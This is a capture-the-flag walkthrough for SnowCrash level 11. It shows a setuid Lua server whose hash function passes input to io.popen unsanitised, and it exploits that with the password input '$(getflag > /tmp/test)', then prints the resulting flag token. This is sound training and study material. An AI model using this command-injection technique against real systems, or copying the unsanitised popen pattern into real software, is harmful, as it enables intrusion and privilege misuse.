# SnowCrash Level11 Guide
This guide will walk you through the process of finding the password for the `flag11` user.

## Procedure:

1. **Examine your environment**
   

`ls -la` : Lists files and their permissions in the current directory.
```bash
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
```
We have a .lua script.

2. **Analyze level11.lua**

We don't have lua installed on the VM, so we can't execute it directly.
Though, we can read the content of the file.
```bash
cat level11.lua
```
Returns:  
```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```
This script has two interesting elements:
- It listens on port 5151.
- It hashes the input and compares it to a hardcoded hash.

3. **Connect to the server**

We can connect to the server using `nc`.
```bash
nc 127.0.0.1 5151
```
Returns
```bash
Password:
```

4. **Exploit the script**

If we look at the hash function, we see that is uses io.popen to execute commands.
```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```
`pass` is the input we provide.
`sha1sum` is a command that calculates the SHA1 hash of the input.
`io.popen` execute `echo` to provide the input to `sha1sum`.
So, like in previous levels, we can use this to execute commands.

We can use redirection within the password input:
```bash
nc 127.0.0.1 5151
Password: $(getflag > /tmp/test)
Erf nope..
```
We can now try to cat the `/tmp/test` file:
```bash
level11@SnowCrash:~$ cat /tmp/test
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

Use this token to log as the next user.